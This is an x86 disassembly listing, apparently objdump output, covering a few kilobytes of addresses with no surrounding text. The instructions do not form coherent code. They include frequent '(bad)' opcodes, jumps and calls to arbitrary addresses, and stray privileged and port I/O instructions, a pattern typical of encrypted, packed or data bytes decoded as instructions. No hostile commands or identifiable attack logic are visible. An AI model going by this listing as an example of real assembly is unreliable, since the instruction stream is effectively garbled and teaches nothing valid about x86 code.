  422d9a:	icebp  
  422d9b:	ffreep st(2)
  422d9d:	retf   
  422d9e:	in     eax,dx
  422d9f:	mov    bh,0xcf
  422da1:	mov    al,0xe1
  422da3:	xlat   BYTE PTR ds:[ebx]
  422da4:	mov    cl,0xfa
  422da6:	retf   
  422da7:	retf   0xfadd
  422daa:	xlat   BYTE PTR ds:[ebx]
  422dab:	repnz sar bl,cl
  422dae:	in     al,dx
  422daf:	(bad)  
  422db1:	fmul   st,st(3)
  422db3:	jmp    0xeb3817bc
  422db8:	loop   0x422d86
  422dba:	clc    
  422dbb:	shl    dh,1
  422dbd:	mov    bl,0xd0
  422dbf:	(bad)  
  422dc0:	retf   0xe2cf
  422dc3:	mov    edx,0xb3f4cdd1
  422dc8:	(bad)  
  422dca:	(bad)  
  422dcc:	ffree  st(7)
  422dce:	fdivrp st(6),st
  422dd0:	mov    ebp,0xd40adbc6
  422dd5:	imul   bh
  422dd7:	or     ecx,ecx
  422dd9:	shl    eax,cl
  422ddb:	retf   
  422ddc:	call   0xe625ef9e
  422de1:	iret   
  422de2:	shl    DWORD PTR [ecx-0x60c2f14],1
  422de8:	shl    bh,cl
  422dea:	call   edx
  422dec:	(bad)  
  422dee:	(bad)  
  422def:	sar    BYTE PTR [ebp-0x412ff622],cl
  422df5:	loopne 0x422e00
  422df7:	loop   0x422e01
  422df9:	out    dx,al
  422dfa:	or     al,0xf0
  422dfc:	fstp   st(5)
  422dfe:	loop   0x422deb
  422e00:	fmul   st(6),st
  422e02:	test   esi,0xcbfbbbeb
  422e08:	mov    ecx,0xf2bbccf5
  422e0d:	aam    0xd7
  422e0f:	neg    ebp
  422e11:	loop   0x422dda
  422e13:	fcmovbe st,st(5)
  422e15:	retf   0x407
  422e18:	jecxz  0x422e19
  422e1a:	(bad)  
  422e1b:	repnz repnz test eax,0xcee0b0e2
  422e22:	repz in al,dx
  422e24:	call   0xee15f508
  422e29:	mov    ebx,0x6f1be02
  422e2e:	add    dh,dl
  422e30:	ret    0xbcb
  422e33:	hlt    
  422e34:	out    0xf,al
  422e36:	cli    
  422e37:	(bad)  
  422e38:	adc    edx,DWORD PTR [edx]
  422e3a:	repz fdiv QWORD PTR [edx-0x1b4d2954]
  422e41:	mov    dh,0xbb
  422e43:	iret   
  422e44:	mov    eax,0xecf1bee7
  422e49:	fdivr  st,st(5)
  422e4b:	sti    
  422e4c:	mov    esi,0xfa0007bf
  422e51:	(bad)  
  422e52:	fld    DWORD PTR [ebx]
  422e54:	(bad)  
  422e56:	or     cl,bl
  422e58:	clc    
  422e59:	push   es
  422e5a:	(bad)  
  422e5b:	jmp    0xe3b4:0xd4adf7eb
  422e62:	mov    bl,0xeb
  422e64:	in     eax,dx
  422e65:	repz xlat BYTE PTR ds:[ebx]
  422e67:	clc    
  422e68:	call   0xf1fc2758
  422e6d:	int    0x3
  422e6f:	mov    ebp,0xeb02dcf4
  422e74:	fisttp QWORD PTR [esi]
  422e76:	jmp    0xe4233a5c
  422e7b:	in     al,0xae
  422e7d:	mov    dl,0xb2
  422e7f:	in     eax,0xd3
  422e81:	jecxz  0x422e51
  422e83:	stc    
  422e84:	in     al,0xd2
  422e86:	out    dx,eax
  422e87:	mov    ebp,0xe2b4facc
  422e8c:	mov    esp,0xbd4dbff
  422e91:	loopne 0x422e9a
  422e93:	(bad)  
  422e96:	fldl2t 
  422e98:	fadd   QWORD PTR [esi]
  422e9a:	pxor   mm3,mm6
  422e9d:	jmp    0x422e50
  422e9f:	rcl    al,cl
  422ea1:	mov    bh,0xa8
  422ea3:	retf   0xe7b8
  422ea6:	test   dh,0xe4
  422ea9:	jecxz  0x422e9d
  422eab:	idiv   DWORD PTR [ebp+esi*4-0xd02fd3a]
  422eb2:	sar    cl,cl
  422eb4:	or     ecx,eax
  422eb6:	jmp    0xd90b1db5
  422ebb:	retf   0xb1f1
  422ebe:	jecxz  0x422e88
  422ec0:	retf   
  422ec1:	retf   
  422ec2:	mov    cl,0xd1
  422ec4:	int    0xad
  422ec6:	mov    ecx,0xdcf3f8ec
  422ecb:	add    eax,esi
  422ecd:	fdiv   st,st(1)
  422ecf:	loopne 0x422e9d
  422ed1:	repz ret 0x6fa
  422ed5:	add    eax,0xed0bf5ee
  422eda:	loopne 0x422e87
  422edc:	lods   al,BYTE PTR ds:[esi]
  422edd:	mov    cl,0xe8
  422edf:	retf   0xc3c9
  422ee2:	(bad)  
  422ee3:	repz sti 
  422ee5:	in     al,0xc9
  422ee7:	shl    ecx,1
  422ee9:	(bad)  
  422eeb:	out    dx,al
  422eec:	(bad)  
  422eed:	cli    
  422eee:	cld    
  422eef:	call   esi
  422ef1:	jecxz  0x422ee4
  422ef3:	hlt    
  422ef4:	mov    esi,0xd9e90e06
  422ef9:	pop    es
  422efa:	shr    ch,0xc4
  422efd:	repnz mov cl,0xe5
  422f00:	out    dx,eax
  422f01:	ret    
  422f02:	sti    
  422f03:	jmp    0xdf0fe8ff
  422f08:	jecxz  0x422f02
  422f0a:	sti    
  422f0b:	rol    eax,0xbf
  422f0e:	add    al,bl
  422f10:	cld    
  422f11:	or     cl,bl
  422f13:	loopne 0x422f0c
  422f15:	retf   
  422f16:	(bad)  
  422f17:	out    dx,al
  422f18:	push   cs
  422f19:	rcr    ecx,cl
  422f1b:	mov    dl,0xa6
  422f1d:	shl    BYTE PTR [eax-0x483e301f],1
  422f23:	jmp    0xe616fbfb
  422f28:	jmp    0xd13a0bf7
  422f2d:	(bad)  
  422f2f:	in     al,dx
  422f30:	test   ecx,0xcaf5e8f6
  422f36:	loope  0x422f2d
  422f38:	syscall 
  422f3a:	cld    
  422f3b:	mov    edi,0xd6e1cdd7
  422f40:	mov    bh,0xa9
  422f42:	enter  0xc4e7,0xb1
  422f46:	fdivr  st,st(0)
  422f48:	repz fcmovne st,st(5)
  422f4b:	(bad)  
  422f4d:	cmc    
  422f4e:	fstp   st(6)
  422f50:	(bad)  
  422f51:	mul    dh
  422f53:	add    dh,al
  422f55:	iret   
  422f56:	call   0x52e0f37
  422f5b:	mov    cl,0xc9
  422f5d:	(bad)
  422f60:	retf   
  422f61:	ret    0xe5e2
  422f64:	out    0xe5,al
  422f66:	lock (bad) 
  422f69:	in     al,dx
  422f6a:	into   
  422f6b:	cmc    
  422f6c:	cli    
  422f6d:	div    ah
  422f6f:	push   es
  422f70:	jecxz  0x422f56
  422f72:	clc    
  422f73:	(bad)  
  422f74:	in     al,0xe3
  422f76:	fcmove st,st(2)
  422f78:	jmp    0x422f84
  422f7a:	add    ebx,eax
  422f7c:	shl    BYTE PTR [eax-0x2539482a],0xfb
  422f83:	mov    ebx,0xb3dae9b4
  422f88:	dec    ebp
  422f8a:	jecxz  0x422f8a
  422f8c:	repnz mov ch,0x5
  422f8f:	rol    bl,0xf4
  422f92:	pop    es
  422f93:	add    bl,al
  422f95:	or     cl,bl
  422f97:	(bad)  
  422f98:	loopne 0x422f79
  422f9a:	in     eax,dx
  422f9b:	fucomp st(1)
  422f9d:	(bad)  
  422f9e:	in     al,0xcc
  422fa0:	loope  0x422f53
  422fa2:	jmp    0xec1de15d
  422fa7:	mov    esi,0xd2babcb6
  422fac:	ret    
  422fad:	push   es
  422fae:	repz mov esp,0xe307d7c6
  422fb4:	push   es
  422fb5:	stc    
  422fb6:	add    al,BYTE PTR [esp+eax*8]
  422fb9:	repz add al,cl
  422fbc:	in     al,0xd7
  422fbe:	mov    dh,0xdd
  422fc0:	mov    bl,0xb4
  422fc2:	test   al,0xb9
  422fc4:	mov    ebx,0x3fafac6
  422fc9:	fstp   st(3)
  422fcb:	not    dh
  422fcd:	hlt    
  422fce:	clc    
  422fcf:	int3   
  422fd0:	rcr    ecx,1
  422fd2:	cmc    
  422fd3:	shl    esi,0xbd
  422fd6:	jmp    0xce0330d7
  422fdb:	(bad)  
  422fdd:	(bad)  
  422fdf:	fnsave [esi-0x3a2c122f]
  422fe5:	aam    0xdf
  422fe7:	(bad)
  422fea:	lock mov ebx,0xfdfdceba
  422ff0:	add    DWORD PTR [edi],eax
  422ff2:	std    
  422ff3:	(bad)  
  422ff4:	out    0xe9,al
  422ff6:	add    al,0x8
  422ff8:	retf   
  422ff9:	out    dx,al
  422ffa:	retf   
  422ffb:	scas   al,BYTE PTR es:[edi]
  422ffc:	mov    dl,0xd3
  422ffe:	(bad)  
  422fff:	cmc    
  423000:	mov    cl,0xe9
  423002:	(bad)  
  423003:	fmul   st,st(5)
  423005:	in     al,0xd9
  423007:	mov    ch,0xf6
  423009:	fcomp  st(7)
  42300b:	loop   0x423006
  42300d:	aad    0xcc
  42300f:	shl    ecx,0x7
  423012:	rol    ch,0x4
  423015:	or     DWORD PTR [ebx],ecx
  423017:	push   es
  423018:	or     ch,bh
  42301a:	loope  0x42300b
  42301c:	jmp    0xbab5:0xc2c5ecec
  423023:	sar    BYTE PTR [eax-0x4a2e3141],cl
  423029:	idiv   BYTE PTR [esi-0xe281f29]
  42302f:	loop   0x422ff6
  423031:	loopne 0x42300d
  423033:	in     al,0x0
  423035:	cld    
  423036:	mov    esp,0xdfdb08cb
  42303b:	mov    cl,0xaf
  42303d:	mov    edi,0xcbc8e0e8
  423042:	xlat   BYTE PTR ds:[ebx]
  423043:	retf   
  423044:	in     eax,0xf2
  423046:	sar    esi,cl
  423048:	retf   
  423049:	(bad)  
  42304a:	mov    al,0xd7
  42304c:	mov    edx,0xfb05fcf3
  423051:	or     ebx,esp
  423053:	add    al,0xdf
  423055:	in     al,0xc7
  423057:	or     eax,0xe8efede9
  42305c:	scas   al,BYTE PTR es:[edi]
  42305d:	fmulp  st(6),st
  42305f:	int    0xac
  423061:	iret   
  423062:	cmc    
  423063:	in     al,dx
  423064:	sar    ebx,cl
  423066:	(bad)  
  423067:	iret   
  423068:	fcomi  st,st(5)
  42306a:	add    edx,edi
  42306c:	mul    bl
  42306e:	mov    eax,0xc0fadef8
  423073:	cld    
  423074:	leave  
  423075:	fisttp WORD PTR [edx]
  423077:	fmul   DWORD PTR [esi]
  423079:	adc    esp,edi
  42307b:	loope  0x423025
  42307d:	lods   eax,DWORD PTR ds:[esi]
  42307e:	out    0xeb,al
  423080:	into   
  423081:	mov    ch,0xd7
  423083:	int3   
  423084:	out    dx,al
  423085:	shr    dl,1
  423087:	mov    ebp,0xbbbfe3ef
  42308c:	mov    dh,0xc2
  42308e:	sar    DWORD PTR [edi-0x28032944],0xdc
  423095:	fcmove st,st(7)
  423097:	fisttp WORD PTR [edi]
  423099:	pop    es
  42309a:	loope  0x423048
  42309c:	in     eax,dx
  42309d:	(bad)  
  42309e:	mov    esi,0xdbdafbc7
  4230a3:	loopne 0x42309b
  4230a5:	fmulp  st(2),st
  4230a7:	(bad)
  4230aa:	aad    0x2
  4230ac:	(bad)  
  4230ad:	aam    0xe1
  4230af:	loope  0x42308b
  4230b1:	xlat   BYTE PTR ds:[ebx]
  4230b2:	fild   WORD PTR [ebx]
  4230b4:	retf   0xfec0
  4230b7:	fadd   st,st(5)
  4230b9:	std    
  4230ba:	out    0xe5,eax
  4230bc:	repnz not ecx
  4230bf:	rol    esi,1
  4230c1:	shl    ebp,cl
  4230c3:	shl    ch,0xb6
  4230c6:	mov    ecx,0xbdf4d0ff
  4230cb:	std    
  4230cc:	add    cl,al
  4230ce:	inc    DWORD PTR [ebx]
  4230d0:	les    edi,FWORD PTR [ebp-0x3e14f81d]
  4230d6:	add    al,0xf8
  4230d8:	fmul   DWORD PTR [eax]
  4230da:	or     bl,dl
  4230dc:	ret    
  4230dd:	repnz out dx,al
  4230df:	mov    al,0xea
  4230e1:	loopne 0x423099
  4230e3:	enter  0xcdba,0xe8
  4230e7:	fdiv   DWORD PTR [ebp+esi*8-0x28122e37]
  4230ee:	out    0x5,eax
  4230f0:	add    bl,ah
  4230f2:	retf   
  4230f3:	rcr    al,1
  4230f5:	(bad)  
  4230f6:	cli    
  4230f7:	(bad)  
  4230f8:	loop   0x4230fc
  4230fa:	call   0xc50bffc4
  4230ff:	scas   al,BYTE PTR es:[edi]
  423100:	enter  0xc9ee,0xed
  423104:	mov    eax,0xe4dfcdf0
  423109:	out    dx,al
  42310a:	out    dx,al
  42310b:	int3   
  42310c:	sar    esp,cl
  42310e:	jecxz  0x423112
  423110:	sti    
  423111:	rcr    bh,cl
  423113:	add    edi,edx
  423115:	not    esi
  423117:	or     esi,edi
  423119:	repz shl ebx,cl
  42311c:	mov    dl,0xdf
  42311e:	leave  
  42311f:	mov    esp,0xb7e1a9ca
  423124:	jmp    0xc010eb14
  423129:	mov    ah,0xcc
  42312b:	(bad)  
  42312c:	mov    edi,0xfdc6b4dd
  423131:	add    DWORD PTR [edi],eax
  423133:	ret    0xc1d9
  423136:	jmp    0xe3292b37
  42313b:	rol    edi,cl
  42313d:	loopne 0x42312b
  42313f:	cmc    
  423140:	idiv   edx
  423142:	int3   
  423143:	fprem  
  423145:	(bad)  
  423147:	bnd jmp 0xbefdf545
  42314d:	rcr    ch,cl
  42314f:	rol    BYTE PTR [ebx],1
  423151:	add    al,0xc0
  423153:	add    eax,0xe5c8e1c5
  423158:	add    esi,ebx
  42315a:	int    0xea
  42315c:	in     eax,dx
  42315d:	ret    0xf1d6
  423160:	retf   
  423161:	in     eax,dx
  423162:	fcmove st,st(3)
  423164:	repz out dx,eax
  423166:	jmp    0x2da:0xfeccfce4
  42316d:	add    esp,ecx
  42316f:	fiadd  DWORD PTR [eax+esi*8]
  423172:	push   esi
  423174:	retf   0xfb
  423177:	fstp   st(7)
  423179:	or     eax,0xcde1c50c
  42317e:	fst    st(5)
  423180:	in     al,0xb1
  423182:	ret    0xf1c8
  423185:	mov    al,0xbf
  423187:	leave  
  423188:	div    ebx
  42318a:	xlat   BYTE PTR ds:[ebx]
  42318b:	fnstsw ax
  42318d:	mov    edi,0xf5c4c3bc
  423193:	jmp    0xeb3f2b8e
  423198:	les    eax,FWORD PTR [esi+eax*1]
  42319b:	(bad)  
  42319c:	idiv   DWORD PTR [edi-0x372a2d36]
  4231a2:	(bad)  
  4231a3:	clc    
  4231a4:	mov    ebx,0xebeef6b1
  4231a9:	shl    esp,cl
  4231ab:	in     al,dx
  4231ac:	out    dx,al
  4231ad:	(bad)  
  4231ae:	ret    0xbc7
  4231b1:	lock cmc 
  4231b3:	add    edi,edi
  4231b5:	stc    
  4231b6:	enter  0x4e4,0xe7
  4231ba:	in     al,0xf0
  4231bc:	into   
  4231bd:	jmp    0x4231a8
  4231bf:	mov    ebp,0xb1e0b7e5
  4231c4:	leave  
  4231c5:	retf   
  4231c6:	lods   al,BYTE PTR ds:[esi]
  4231c7:	stc    
  4231c8:	in     al,0xef
  4231ca:	in     eax,dx
  4231cb:	fcmovne st,st(0)
  4231cd:	fsubp  st(5),st
  4231cf:	sti    
  4231d0:	(bad)  
  4231d2:	not    esi
  4231d4:	jmp    0x4231b2
  4231d6:	add    al,0xcb
  4231d8:	or     ebx,edi
  4231da:	add    esp,edi
  4231dc:	into   
  4231dd:	jmp    0x4231bf
  4231df:	lods   al,BYTE PTR ds:[esi]
  4231e0:	mov    esp,0xd8daccda
  4231e5:	iret   
  4231e6:	fstp   st(0)
  4231e8:	les    esi,FWORD PTR [ecx-0x1e234833]
  4231ee:	inc    DWORD PTR [ecx]
  4231f0:	(bad)  
  4231f2:	jmp    0xbe8:0xe1cadbc1
  4231f9:	fild   WORD PTR [esi]
  4231fb:	fxch   st(2)
  4231fd:	jmp    0xf718e5ee
  423202:	jmp    0xc9c4:0xcce9ebef
  423209:	rol    ebx,1
  42320b:	call   ebp
  42320d:	iret   
  42320e:	mov    esi,0xc5d6f6f0
  423213:	add    al,0xd6
  423215:	or     bh,bh
  423217:	out    dx,al
  423218:	fmul   st,st(3)
  42321a:	jecxz  0x4231fe
  42321c:	mov    cl,0xbf
  42321e:	int    0xb5
  423220:	xlat   BYTE PTR ds:[ebx]
  423221:	mov    ch,0xb1
  423223:	(bad)  
  423224:	xbegin 0xf90f11fe
  42322a:	mov    ebp,0xd603dafb
  42322f:	repz add eax,0xc0f8fc0b
  423235:	cld    
  423236:	push   es
  423237:	fild   DWORD PTR [esi]
  423239:	out    0xcf,al
  42323b:	loop   0x423214
  42323d:	test   ch,0xac
  423240:	loop   0x423237
  423242:	in     eax,dx
  423243:	out    dx,eax
  423244:	fdiv   st,st(1)
  423246:	fldl2t 
  423248:	mov    ebp,0xb6f6d1ce
  42324d:	push   es
  42324e:	in     eax,0x1
  423250:	test   DWORD PTR [ecx],0xc40bdcc5
  423256:	loope  0x42321d
  423258:	or     ah,cl
  42325a:	into   
  42325b:	fstp   st(7)
  42325d:	call   0xc306e345
  423262:	enter  0xf6b7,0xcd
  423266:	xlat   BYTE PTR ds:[ebx]
  423267:	mov    ecx,0xf2d0b5cf
  42326c:	(bad)  
  42326d:	repz fadd DWORD PTR [edx+eax*1]
  423271:	fadd   DWORD PTR [eax]
  423273:	fsqrt  
  423275:	retf   0xeb03
  423278:	leave  
  423279:	fcmove st,st(6)
  42327b:	test   al,0xac
  42327d:	scas   eax,DWORD PTR es:[edi]
  42327e:	rol    cl,0xae
  423281:	mov    ah,0xf0
  423283:	(bad)  
  423284:	in     al,dx
  423285:	(bad)  
  423286:	fnstenv [ebp-0x8051515]
  42328c:	loop   0x423266
  42328e:	int    0xf9
  423290:	inc    ch
  423292:	sti    
  423293:	or     DWORD PTR [esi+0xff90bd8],edi
  423299:	out    dx,eax
  42329a:	add    edi,ecx
  42329c:	int3   
  42329d:	in     al,0xf0
  42329f:	ror    ah,cl
  4232a1:	in     eax,0xc7
  4232a3:	out    dx,al
  4232a4:	in     eax,dx
  4232a5:	icebp  
  4232a6:	std    
  4232a7:	not    esi
  4232a9:	jecxz  0x4232a1
  4232ab:	mov    edi,0xf0da06f2
  4232b0:	(bad)  
  4232b1:	fadd   QWORD PTR [edx]
  4232b3:	loope  0x4232b8
  4232b5:	cld    
  4232b6:	in     eax,dx
  4232b7:	fadd   st,st(6)
  4232b9:	out    dx,eax
  4232ba:	add    al,bl
  4232bc:	jmp    0xcda9:0xd3ece1cf
  4232c3:	iret   
  4232c4:	(bad)  
  4232c6:	leave  
  4232c7:	cmc    
  4232c8:	int    0xfc
  4232ca:	mov    ebp,0x7ddddd7
  4232cf:	icebp  
  4232d0:	(bad)  
  4232d2:	(bad)  
  4232d3:	loope  0x42329d
  4232d5:	leave  
  4232d6:	leave  
  4232d7:	in     al,0xdf
  4232d9:	in     eax,dx
  4232da:	cld    
  4232db:	retf   
  4232dc:	loopne 0x4232a2
  4232de:	out    dx,eax
  4232df:	int    0xd2
  4232e1:	shl    BYTE PTR [edi-0xa261b49],0xd6
  4232e8:	lock xlat BYTE PTR ds:[ebx]
  4232ea:	retf   0xc2e0
  4232ed:	loop   0x4232e8
  4232ef:	mov    ebx,0xe1dbc7ff
  4232f4:	imul   bl
  4232f6:	cld    
  4232f7:	psubusb mm0,QWORD PTR [esi]
  4232fa:	iret   
  4232fb:	fsubr  DWORD PTR [edx-0x550e1640]
  423301:	cmc    
  423302:	mov    ah,0xc9
  423304:	mov    dh,0xc5
  423306:	clc    
  423307:	in     al,dx
  423308:	aam    0xbf
  42330a:	call   0x12632eb
  42330f:	mov    ebp,0xc6f0c0ec
  423314:	out    0xc4,eax
  423316:	enter  0xe3e3,0x2
  42331a:	fmulp  st(1),st
  42331c:	fsub   DWORD PTR [ebp-0x320a3f38]
  423322:	in     eax,dx
  423323:	hlt    
  423324:	jmp    0xfafe:0xfcccddf6
  42332b:	mov    edi,0xbcdbdafa
  423330:	add    bl,cl
  423332:	rol    BYTE PTR [ecx],0xfe
  423335:	enter  0xe7ea,0xcc
  423339:	or     dh,dl
  42333b:	stos   BYTE PTR es:[edi],al
  42333c:	lock int3 
  42333e:	repz into 
  423340:	mov    bh,0xf2
  423342:	repz lock shl esi,cl
  423346:	leave  
  423347:	out    dx,al
  423348:	into   
  423349:	hlt    
  42334a:	clc    
  42334b:	fdivr  st(3),st
  42334d:	rcl    ah,cl
  42334f:	(bad)  
  423350:	out    0x7,eax
  423352:	add    ah,ah
  423354:	(bad)  
  423355:	(bad)  
  423357:	(bad)
  42335a:	int    0xc2
  42335c:	mov    eax,0xe6c2cdc4
  423361:	out    0xd9,eax
  423363:	out    0xd7,al
  423365:	out    0xbb,eax
  423367:	cmc    
  423368:	out    dx,eax
  423369:	retf   
  42336a:	std    
  42336b:	(bad)  
  42336d:	out    0xc0,eax
  42336f:	icebp  
  423370:	clc    
  423371:	(bad)  
  423372:	fdiv   st(3),st
  423374:	add    al,BYTE PTR ds:0x2ebee0d
  42337a:	push   es
  42337b:	mov    esi,0xf0ced2f7
  423380:	(bad)
  423383:	fmul   st,st(5)
  423385:	ror    ah,1
  423387:	retf   
  423388:	mov    dh,0x3
  42338a:	call   0xd9fb1580
  42338f:	(bad)  
  423390:	rol    DWORD PTR [eax],1
  423392:	add    ecx,edx
  423394:	(bad)  
  423396:	mov    esp,0xfdefbef
  42339b:	ffreep st(6)
  42339d:	scas   al,BYTE PTR es:[edi]
  42339e:	mov    dh,0xcf
  4233a0:	jmp    0xcd0ffd8b
  4233a5:	out    0xf0,al
  4233a7:	jmp    0xecdd:0xbeec02d4
  4233ae:	(bad)  
  4233af:	not    bh
  4233b1:	std    
  4233b2:	imul   bl
  4233b4:	retf   
  4233b5:	out    0xe6,eax
  4233b7:	cmc    
  4233b8:	int3   
  4233b9:	(bad)  
  4233ba:	clc    
  4233bb:	mov    esp,0xcaedd2dd
  4233c0:	lods   eax,DWORD PTR ds:[esi]
  4233c1:	icebp  
  4233c2:	iret   
  4233c3:	mov    bh,0xed
  4233c5:	jmp    0x423377
  4233c7:	mov    bh,0xd0
  4233c9:	add    dh,bl
  4233cb:	rcl    dl,cl
  4233cd:	repnz mov esp,0xeaf2fae0
  4233d3:	add    ah,dl
  4233d5:	(bad)  
  4233d7:	in     eax,0xfc
  4233d9:	int3   
  4233da:	add    cl,ah
  4233dc:	retf   0xc5ae
  4233df:	enter  0xe1fb,0xb3
  4233e3:	(bad)  
  4233e4:	lock int 0xfe
  4233e7:	(bad)  
  4233e9:	mov    esi,0xbdf6dbf4
  4233ee:	loopne 0x4233ed
  4233f0:	add    dl,dl
  4233f2:	stc    
  4233f3:	add    al,0xeb
  4233f5:	out    dx,eax
  4233f6:	jmp    0xebaa:0xdcafbca
  4233fd:	(bad)  
  4233fe:	call   0xe1f2f7e5
  423403:	div    DWORD PTR [esi+esi*4-0x2615364a]
  42340a:	ret    0x1dc
  42340d:	fst    st(7)
  42340f:	(bad)  
  423410:	in     al,dx
  423411:	cld    
  423412:	ret    0xe9e8
  423415:	paddusw mm5,mm2
  423418:	call   0xcb3333de
  42341d:	fucom  st(4)
  42341f:	mov    esp,0xe6e9e1ac
  423424:	cmc    
  423425:	lock (bad) 
  423427:	fstp   st(3)
  423429:	fldl2t 
  42342b:	fnstsw WORD PTR [ecx-0x21fc2612]
  423431:	ret    0xb01
  423434:	jmp    0x141e2247
  423439:	enter  0xecc9,0xaf
  42343d:	out    0xf0,al
  42343f:	jmp    0x42342f
  423441:	in     eax,0xda
  423443:	out    0xb2,eax
  423445:	(bad)  
  423446:	fstp   TBYTE PTR [edi-0x6052141]
  42344c:	fdivr  st(5),st
  42344e:	add    eax,edi
  423450:	add    eax,0xc8e406d3
  423455:	(bad)  [edx]
  423457:	in     eax,0xe
  423459:	or     eax,DWORD PTR [edi]
  42345b:	test   eax,0xb7c3ecca
  423460:	mul    esi
  423462:	leave  
  423463:	jmp    0x42341f
  423465:	fsubp  st(3),st
  423467:	fdiv   st(4),st
  423469:	out    dx,eax
  42346a:	imul   bh
  42346c:	(bad)  
  42346e:	mov    esp,0xfffdc0d4
  423473:	in     al,0x9
  423475:	loope  0x423453
  423477:	paddusw mm5,mm5
  42347a:	out    dx,al
  42347b:	shl    ecx,0xde
  42347e:	lods   eax,DWORD PTR ds:[esi]
  42347f:	int    0xd7
  423481:	leave  
  423482:	aad    0xf9
  423484:	ror    cl,1
  423486:	lock cmc 
  423488:	(bad)  
  42348a:	loop   0x42346b
  42348c:	(bad)  
  42348e:	cli    
  42348f:	add    eax,ebx
  423491:	cli    
  423492:	add    al,0xfa
  423494:	pmaddwd mm5,mm7
  423497:	out    dx,al
  423498:	fcmove st,st(2)
  42349a:	or     dl,cl
  42349c:	(bad)  
  42349e:	out    dx,eax
  42349f:	aam    0xe9
  4234a1:	ror    esi,0xb1
  4234a4:	jmp    0xdb19ea98
  4234a9:	mov    eax,0xf3f4edf1
  4234ae:	hlt    
  4234af:	mov    esi,0xf7cab9e5
  4234b4:	cmc    
  4234b5:	add    dh,ch
  4234b7:	jecxz  0x4234c0
  4234b9:	loop   0x42349f
  4234bb:	fsubp  st(3),st
  4234bd:	shl    esp,cl
  4234bf:	rol    dl,0xb0
  4234c2:	loop   0x4234ae
  4234c4:	les    edi,FWORD PTR [edi-0x11210e]
  4234ca:	aad    0xdc
  4234cc:	jecxz  0x4234a7
  4234ce:	jecxz  0x423497
  4234d0:	pop    es
  4234d1:	mov    ebp,0x7e7fadc
  4234d6:	enter  0xcd07,0xe5
  4234da:	or     ebp,DWORD PTR [edx-0x370f3e33]
  4234e0:	icebp  
  4234e1:	out    0xda,eax
  4234e3:	mov    bh,0xcc
  4234e5:	mov    dh,0xc9
  4234e7:	jmp    0xc23b1da1
  4234ec:	rcl    edi,cl
  4234ee:	add    BYTE PTR [edi-0x25083c10],bh
  4234f4:	mov    BYTE PTR [edx],0xcf
  4234f7:	add    ebx,esp
  4234f9:	in     eax,dx
  4234fa:	add    ah,al
  4234fc:	in     eax,dx
  4234fd:	faddp  st(5),st
  4234ff:	mov    cl,0xd5
  423501:	xlat   BYTE PTR ds:[ebx]
  423502:	shr    DWORD PTR [edi-0x214b1240],cl
  423508:	shl    DWORD PTR [ecx-0x32101347],cl
  42350e:	(bad)  
  42350f:	out    0xc4,eax
  423511:	(bad)  
  423512:	fdivr  st(5),st
  423514:	xlat   BYTE PTR ds:[ebx]
  423515:	or     ebp,esp
  423517:	clc    
  423518:	loope  0x4234f2
  42351a:	out    0xe3,eax
  42351c:	fidiv  WORD PTR [ebx-0x39234f4e]
  423522:	jmp    0xf73c0ae0
  423527:	fdiv   DWORD PTR [ebp-0x3f314331]
  42352d:	int    0xb8
  42352f:	pop    es
  423530:	icebp  
  423531:	add    edi,ebx
  423533:	add    edi,esp
  423535:	fld    QWORD PTR [ebx]
  423537:	out    dx,eax
  423538:	jecxz  0x423533
  42353a:	or     DWORD PTR [ecx-0x52573650],esi
  423540:	in     eax,0xc4
  423542:	hlt    
  423543:	in     al,dx
  423544:	iret   
  423545:	fcmovbe st,st(7)
  423547:	(bad)  
  423548:	jmp    0xc6cc:0xe2ccc8fc
  42354f:	repz clc 
  423551:	dec    BYTE PTR [ebx]
  423553:	leave  
  423554:	fucom  st(7)
  423556:	in     eax,dx
  423557:	loopne 0x423556
  423559:	or     esp,ecx
  42355b:	jmp    0xb0d3:0xe9a8ebc4
  423562:	mov    al,0xcd
  423564:	iret   
  423565:	hlt    
  423566:	mov    eax,0xbfddefce
  42356b:	aad    0xc8
  42356d:	add    edi,eax
  42356f:	icebp  
  423570:	(bad)  
  423572:	add    ah,dl
  423574:	(bad)  
  423576:	shl    cl,0xec
  423579:	clc    
  42357a:	out    0xed,eax
  42357c:	jmp    0xf6310652
  423581:	jmp    0xe6172768
  423586:	fnstenv [edi+0xf8bfd1]
  42358c:	out    0xd7,eax
  42358e:	std    
  42358f:	jecxz  0x423557
  423591:	or     al,BYTE PTR [esi*8-0x17f9fd05]
  423598:	or     ch,ch
  42359a:	ror    dh,cl
  42359c:	mov    ebp,0xedc4bded
  4235a1:	mov    ah,0xe6
  4235a3:	cli    
  4235a4:	sar    al,cl
  4235a6:	in     eax,dx
  4235a7:	std    
  4235a8:	iret   
  4235a9:	icebp  
  4235aa:	into   
  4235ab:	stc    
  4235ac:	add    esi,edx
  4235ae:	shl    dl,cl
  4235b0:	jecxz  0x4235aa
  4235b2:	xlat   BYTE PTR ds:[ebx]
  4235b3:	mul    al
  4235b5:	jmp    0xf2c3a8e
  4235ba:	adc    ebx,ecx
  4235bc:	call   0xc51a1b98
  4235c1:	lock enter 0xcac5,0xb6
  4235c6:	in     al,dx
  4235c7:	fistp  QWORD PTR [ebx-0xd274243]
  4235cd:	mov    ecx,0xfbe0cdbc
  4235d2:	jecxz  0x4235b4
  4235d4:	add    dl,dh
  4235d6:	hlt    
  4235d7:	fscale 
  4235d9:	or     ebp,esp
  4235db:	sar    DWORD PTR [edi-0x2a3c0c32],0xfa
  4235e2:	int3   
  4235e3:	fdiv   st,st(5)
  4235e5:	jmp    0xd6380dbc
  4235ea:	mov    esp,0xb4cfd3db
  4235ef:	repnz aam 0xfc
  4235f2:	icebp  
  4235f3:	add    edx,esp
  4235f5:	fcmove st,st(3)
  4235f7:	fsubp  st(1),st
  4235f9:	inc    DWORD PTR [edi]
  4235fb:	test   eax,0xc1e1cfd0
  423600:	mov    dl,0xb7
  423602:	ret    0xe6d8
  423605:	out    dx,eax
  423606:	repz div BYTE PTR [edi+ebx*8+0x3f3d0cd]
  42360e:	(bad)  
  42360f:	hlt    
  423610:	clc    
  423611:	or     al,BYTE PTR ds:0xd9f709f4
  423617:	add    eax,0xe3d8fcce
  42361c:	(bad)
  42361f:	(bad)
  423622:	ret    0xc4e6
  423625:	mov    ecx,0xfcbeeaee
  42362a:	into   
  42362b:	loop   0x4235e5
  42362d:	mov    ch,0xbf
  42362f:	fld    st(1)
  423631:	sar    edi,cl
  423633:	in     eax,0x1
  423635:	(bad)  
  423636:	jecxz  0x423606
  423638:	into   
  423639:	or     DWORD PTR [edi],eax
  42363b:	scas   al,BYTE PTR es:[edi]
